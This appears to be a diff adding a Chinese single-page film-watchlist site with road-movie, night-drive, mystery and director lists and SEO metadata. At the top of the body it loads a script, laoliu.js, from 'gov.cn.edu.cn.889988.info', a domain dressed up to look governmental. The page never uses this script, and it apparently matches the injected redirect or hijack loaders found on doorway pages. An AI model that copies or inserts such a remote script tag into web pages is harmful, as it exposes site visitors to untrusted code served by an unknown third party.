@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>老司记电影网 - 老影迷的片单导航</title>
+<meta name="description" content="老司记电影网(laosijidianyingwang-h5)由老影迷记片账：公路片、夜驾片、悬疑线、导演片单、避雷指南，移动端自适应，必应收录友好。">
+<meta name="keywords" content="老司记电影网, laosijidianyingwang-h5, 片单导航, 公路电影, 夜驾片, 悬疑片单, 老影迷">
+<meta name="author" content="老司记电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://laosijidianyingwang-h5.github.io/">
+
+<style>
+:root{
+  --night:#0e1116;
+  --road:#161b22;
+  --road2:#1d2530;
+  --line:#2a3340;
+  --neon:#ffcf4d;
+  --neon2:#ff7a59;
+  --cyan:#46e0d0;
+  --text:#e7edf3;
+  --muted:#8b9bab;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",Arial,sans-serif;
+  background:
+    radial-gradient(120% 60% at 90% -10%, rgba(255,122,89,.18), transparent 55%),
+    radial-gradient(120% 60% at 0% 0%, rgba(70,224,208,.12), transparent 50%),
+    var(--night);
+  color:var(--text);
+  line-height:1.7;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 路牌条 */
+.road-bar{
+  background:linear-gradient(90deg,var(--neon),var(--neon2));
+  color:#1a1205;
+  text-align:center;
+  font-size:11px;
+  letter-spacing:2px;
+  padding:5px 10px;
+  font-weight:700;
+}
+
+/* 头 */
+.header{
+  max-width:1100px;margin:0 auto;
+  padding:22px 20px 14px;
+  display:flex;align-items:center;justify-content:space-between;
+  gap:16px;flex-wrap:wrap;
+}
+.brand{display:flex;align-items:center;gap:14px}
+.badge-sign{
+  width:54px;height:54px;border-radius:8px;
+  background:linear-gradient(135deg,var(--neon),var(--neon2));
+  color:#1a1205;font-size:26px;
+  display:flex;align-items:center;justify-content:center;
+  box-shadow:0 0 18px rgba(255,207,77,.35);
+  transform:skewX(-6deg);
+}
+.brand h1{font-size:23px;letter-spacing:2px}
+.brand .sub{font-size:11px;color:var(--muted);font-family:Arial,sans-serif}
+.header-search{flex:1;max-width:300px}
+.header-search form{display:flex;height:38px;border-radius:19px;overflow:hidden;border:1px solid var(--line);background:var(--road)}
+.header-search input{flex:1;border:none;outline:none;background:transparent;color:var(--text);padding:0 16px;font-size:13px}
+.header-search button{border:none;background:var(--neon);color:#1a1205;padding:0 18px;font-size:13px;cursor:pointer;font-weight:700}
+
+/* 导航 */
+.nav{
+  max-width:1100px;margin:0 auto;
+  padding:0 20px;
+  display:flex;gap:10px;flex-wrap:wrap;
+}
+.nav a{
+  padding:8px 16px;border:1px solid var(--line);border-radius:20px;
+  font-size:13px;color:var(--muted);
+}
+.nav a:hover,.nav a.active{background:var(--neon);color:#1a1205;border-color:var(--neon);font-weight:700}
+
+/* 主区 */
+.main{max-width:1100px;margin:0 auto;padding:20px 20px 30px}
+
+/* 英雄：夜路横幅 */
+.hero{
+  position:relative;
+  background:linear-gradient(135deg,var(--road2),#10151c);
+  border:1px solid var(--line);
+  border-left:5px solid var(--neon);
+  border-radius:14px;
+  padding:26px 24px;
+  overflow:hidden;
+  margin-bottom:26px;
+}
+.hero::after{content:"🛣️";position:absolute;right:10px;bottom:-14px;font-size:120px;opacity:.06}
+.hero h2{font-size:25px;margin-bottom:8px}
+.hero p{color:var(--muted);max-width:620px;font-size:14px}
+.hero .chips{margin-top:14px;display:flex;gap:8px;flex-wrap:wrap}
+.hero .chips span{padding:4px 12px;border:1px solid var(--line);border-radius:20px;font-size:12px;color:var(--neon);background:rgba(255,207,77,.06)}
+
+/* 栏目头 */
+.section{margin-bottom:30px}
+.s-head{display:flex;align-items:center;gap:10px;margin-bottom:14px}
+.s-head .no{
+  width:28px;height:28px;border-radius:6px;
+  background:var(--neon);color:#1a1205;
+  display:flex;align-items:center;justify-content:center;
+  font-weight:800;font-size:13px;
+}
+.s-head h3{font-size:18px}
+.s-head .more{margin-left:auto;font-size:12px;color:var(--neon2);font-family:Arial,sans-serif}
+
+/* 栏目一：路线片单（路牌卡片） */
+.routes{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.route-card{
+  background:var(--road);
+  border:1px solid var(--line);
+  border-top:3px solid var(--neon);
+  border-radius:12px;
+  padding:18px;
+  transition:transform .25s;
+}
+.route-card:hover{transform:translateY(-4px)}
+.route-card .km{font-family:Arial,sans-serif;font-size:12px;color:var(--cyan)}
+.route-card h4{font-size:16px;margin:6px 0}
+.route-card .meta{font-size:12px;color:var(--muted);font-family:Arial,sans-serif;margin-bottom:8px}
+.route-card p{font-size:13px;color:#c4cdd6}
+.route-card .tags{margin-top:10px;display:flex;gap:6px;flex-wrap:wrap}
+.route-card .tags em{font-style:normal;font-size:11px;padding:2px 9px;border:1px solid var(--line);border-radius:10px;color:var(--neon)}
+
+/* 栏目二：夜驾歌单式列表 */
+.night-list{background:var(--road);border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.night-row{display:flex;align-items:center;gap:14px;padding:14px 16px;border-bottom:1px solid var(--line)}
+.night-row:last-child{border-bottom:none}
+.night-ico{width:40px;height:40px;border-radius:50%;background:rgba(70,224,208,.1);border:1px solid var(--line);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
+.night-info{flex:1}
+.night-info h4{font-size:14px}
+.night-info p{font-size:11px;color:var(--muted);font-family:Arial,sans-serif}
+.night-time{font-family:Arial,sans-serif;font-size:12px;color:var(--neon);flex-shrink:0}
+
+/* 栏目三：路书横向滚动 */
+.roadbook{display:flex;gap:14px;overflow-x:auto;padding-bottom:10px;scroll-snap-type:x mandatory}
+.rb-card{scroll-snap-align:start;flex:0 0 230px;background:var(--road);border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.rb-top{height:84px;display:flex;align-items:center;justify-content:center;font-size:38px}
+.rb-card:nth-child(1) .rb-top{background:linear-gradient(135deg,#ffcf4d,#ff7a59)}
+.rb-card:nth-child(2) .rb-top{background:linear-gradient(135deg,#46e0d0,#2b7fff)}
+.rb-card:nth-child(3) .rb-top{background:linear-gradient(135deg,#b388ff,#7c4dff)}
+.rb-card:nth-child(4) .rb-top{background:linear-gradient(135deg,#ff8a8a,#ff5252)}
+.rb-card:nth-child(5) .rb-top{background:linear-gradient(135deg,#aed581,#7cb342)}
+.rb-body{padding:12px}
+.rb-body h4{font-size:14px;margin-bottom:4px}
+.rb-body p{font-size:11px;color:var(--muted);line-height:1.5}
+
+/* 栏目四：老司记手账 */
+.note{
+  background:var(--road);
+  border:1px dashed var(--line);
+  border-radius:12px;
+  padding:20px;
+  display:flex;gap:16px;align-items:flex-start;flex-wrap:wrap;
+}
+.note .pen{font-size:34px}
+.note h3{font-size:16px;margin-bottom:6px;color:var(--neon)}
+.note p{font-size:13px;color:#c4cdd6;max-width:620px}
+.note .url{margin-top:8px;font-family:Arial,sans-serif;font-size:12px;color:var(--cyan)}
+
+/* 页脚 */
+.footer{margin-top:30px;border-top:1px solid var(--line);background:#0b0e13;padding:26px 20px 36px;text-align:center}
+.footer-inner{max-width:1100px;margin:0 auto}
+.footer p{font-size:12px;color:var(--muted);margin-bottom:4px;font-family:Arial,sans-serif}
+.footer a{color:var(--neon)}
+.footer .fn{margin-top:12px;display:flex;justify-content:center;gap:16px;flex-wrap:wrap}
+.footer .fn a{font-size:12px;color:var(--muted)}
+.footer .fn a:hover{color:var(--text)}
+
+@media(max-width:860px){.routes{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:640px){
+  .header{padding:16px 16px 10px}
+  .badge-sign{width:44px;height:44px;font-size:22px}
+  .brand h1{font-size:18px}
+  .header-search{display:none}
+  .nav{padding:0 16px;gap:8px}
+  .nav a{padding:6px 12px;font-size:12px}
+  .main{padding:14px 16px 24px}
+  .hero{padding:18px 14px;border-radius:10px}
+  .hero h2{font-size:20px}
+  .routes{grid-template-columns:1fr}
+  .night-row{flex-wrap:wrap;gap:10px}
+  .night-time{width:100%}
+  .rb-card{flex-basis:80%}
+  .note{padding:16px 14px}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="road-bar">🛣️ 老司记电影网 · 老影迷记片账 · 单页自适应 · 必应收录友好</div>
+
+<header class="header">
+  <div class="brand">
+    <div class="badge-sign">🛣️</div>
+    <div>
+      <h1>老司记电影网</h1>
+      <div class="sub">laosijidianyingwang-h5 · 片单导航</div>
+    </div>
+  </div>
+  <div class="header-search">
+    <form action="#" method="get">
+      <input type="text" name="q" placeholder="搜公路片 / 夜驾片 / 导演线...">
+      <button type="submit">出发</button>
+    </form>
+  </div>
+</header>
+
+<nav class="nav">
+  <a href="#" class="active">首页</a>
+  <a href="#">公路电影</a>
+  <a href="#">夜驾片单</a>
+  <a href="#">悬疑线</a>
+  <a href="#">导演路书</a>
+  <a href="#">冷门支路</a>
+  <a href="#">避雷指南</a>
+  <a href="#">关于老司记</a>
+</nav>
+
+<div class="main">
+
+  <!-- 英雄 -->
+  <section class="hero">
+    <h2>路熟，片也熟：老影迷帮你记片账</h2>
+    <p>不整花活，不碰灰色资源。老司记只做一件事：把「该看哪部、按什么顺序看、哪条线不踩雷」写成路书。公路、夜驾、悬疑、作者导演、冷门支路，一条一条跑给你看。</p>
+    <div class="chips">
+      <span>公路片</span><span>夜驾片</span><span>悬疑长线</span><span>导演片单</span><span>避雷</span>
+    </div>
+  </section>
+
+  <!-- 栏目一 -->
+  <section class="section" id="routes">
+    <div class="s-head"><span class="no">01</span><h3>推荐路线 · 片单导航</h3><a class="more" href="#">全部路线 #</a></div>
+    <div class="routes">
+      <article class="route-card">
+        <div class="km">Route A · 公路 1200km</div>
+        <h4>《逍遥骑士》→《末路狂花》→《荒野生存》</h4>
+        <div class="meta">1969 / 1991 / 2007 · 自由与出走</div>
+        <p>从加州公路到西部荒原，一条“离开体制”的片单线，适合深夜一个人看。</p>
+        <div class="tags"><em>公路</em><em>自由</em><em>西部</em></div>
+      </article>
+      <article class="route-card">
+        <div class="km">Route B · 夜驾 800km</div>
+        <h4>《驾驶课》→《亡命驾驶》→《极速车王》</h4>
+        <div class="meta">霓虹 / 引擎 / 孤独司机</div>
+        <p>城市夜路、停车场对峙、赛道长镜头。听觉优先的片单，戴耳机看。</p>
+        <div class="tags"><em>夜驾</em><em>赛车</em><em>霓虹</em></div>
+      </article>
+      <article class="route-card">
+        <div class="km">Route C · 悬疑 1500km</div>
+        <h4>《看不见的客人》→《记忆碎片》→《驾驶我的车》</h4>
+        <div class="meta">反转 / 时间 / 台词</div>
+        <p>一条“别信第一层叙事”的线，适合喜欢复盘剧情的老影迷。</p>
+        <div class="tags"><em>悬疑</em><em>叙事</em><em>复盘</em></div>
+      </article>
+      <article class="route-card">
+        <div class="km">Route D · 作者线 900km</div>
+        <h4>是枝裕和：从《步履不停》到《怪物》</h4>
+        <div class="meta">家庭 / 留白 / 日常神性</div>
+        <p>不靠大事件，靠饭桌、走廊、未接电话。家庭片入门最稳的一条线。</p>
+        <div class="tags"><em>作者</em><em>家庭</em><em>日影</em></div>
+      </article>
+      <article class="route-card">
+        <div class="km">Route E · 冷门支路 600km</div>
+        <h4>《路边野餐》→《地球最后的夜晚》→《长江图》</h4>
+        <div class="meta">诗性 / 长镜 / 南方</div>
+        <p>别用爆米花脑子看，用耳朵和记忆看。华语作者片里的“水路”。</p>
+        <div class="tags"><em>诗电影</em><em>华语</em><em>长镜</em></div>
+      </article>
+      <article class="route-card">
+        <div class="km">Route F · 避雷环线 400km</div>
+        <h4>高分滤镜：这些“神片”不一定适合你</h4>
+        <div class="meta">口碑 ≠ 适配</div>
+        <p>慢片、闷片、实验片怎么挑着看，老司记帮你标红：别硬啃。</p>
+        <div class="tags"><em>避雷</em><em>适配</em><em>观影门槛</em></div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二 -->
+  <section class="section" id="night">
+    <div class="s-head"><span class="no">02</span><h3>夜驾片单 · 凌晨场</h3><a class="more" href="#">更多 #</a></div>
+    <div class="night-list">
+      <div class="night-row">
+        <div class="night-ico">🌃</div>
+        <div class="night-info"><h4>《亡命驾驶》</h4><p>2011 · 霓虹车流 / 少台词 / 合成器配乐</p></div>
+        <div class="night-time">23:00 上路</div>
+      </div>
+      <div class="night-row">
+        <div class="night-ico">🛻</div>
+        <div class="night-info"><h4>《三块广告牌》</h4><p>2017 · 夜路骂战 / 愤怒与救赎</p></div>
+        <div class="night-time">00:30 夜谈</div>
+      </div>
+      <div class="night-row">
+        <div class="night-ico">🛰️</div>
+        <div class="night-info"><h4>《银翼杀手2049》</h4><p>2017 · 雨夜未来城 / 长镜 / 孤独</p></div>
+        <div class="night-time">02:00 雨夜</div>
+      </div>
+      <div class="night-row">
+        <div class="night-ico">🚇</div>
+        <div class="night-info"><h4>《地球最后的夜晚》</h4><p>2018 · 3D长镜 / 梦境 / 贵州夜</p></div>
+        <div class="night-time">03:00 入梦</div>
+      </div>
+      <div class="night-row">
+        <div class="night-ico">🕯️</div>
+        <div class="night-info"><h4>《驾驶我的车》</h4><p>2021 · 长途车里的台词与创伤</p></div>
+        <div class="night-time">04:00 收车</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三 -->
+  <section class="section" id="roadbook">
+    <div class="s-head"><span class="no">03</span><h3>路书 · 按类型发车</h3><a class="more" href="#">全部路书 #</a></div>
+    <div class="roadbook">
+      <div class="rb-card"><div class="rb-top">🛣️</div><div class="rb-body"><h4>公路片</h4><p>出走、加油站、后视镜里的过去。</p></div></div>
+      <div class="rb-card"><div class="rb-top">🌃</div><div class="rb-body"><h4>夜驾片</h4><p>城市霓虹、停车场、引擎低频。</p></div></div>
+      <div class="rb-card"><div class="rb-top">🧩</div><div class="rb-body"><h4>悬疑片</h4><p>时间错位、叙述性诡计、二次复盘。</p></div></div>
+      <div class="rb-card"><div class="rb-top">🎬</div><div class="rb-body"><h4>作者片</h4><p>固定班底、长焦、饭桌与留白。</p></div></div>
+      <div class="rb-card"><div class="rb-top">🛟</div><div class="rb-body"><h4>避雷片</h4><p>高分但闷、有名但难入口。</p></div></div>
+    </div>
+  </section>
+
+  <!-- 栏目四 -->
+  <section class="section" id="about">
+    <div class="s-head"><span class="no">04</span><h3>老司记手账</h3></div>
+    <div class="note">
+      <div class="pen">🖊️</div>
+      <div>
+        <h3>不是资源站，是片单导航站</h3>
+        <p>老司记电影网（laosijidianyingwang-h5）只做选片与路线整理：哪部先吃、哪部留到凌晨、哪部别硬看。所有内页用 # 占位，单页结构、移动端自适应、不提供盗版下载，正版平台在哪看另说。</p>
+        <div class="url">https://laosijidianyingwang-h5.github.io</div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <div class="footer-inner">
+    <p>© 2026 老司记电影网 | laosijidianyingwang-h5</p>
+    <p>永久地址：<a href="https://laosijidianyingwang-h5.github.io">https://laosijidianyingwang-h5.github.io</a></p>
+    <p>本站为影视推荐/片单导航站，不提供盗版资源下载。</p>
+    <div class="fn">
+      <a href="#">首页</a><a href="#">路线</a><a href="#">夜驾</a><a href="#">路书</a><a href="#">避雷</a><a href="#">关于</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
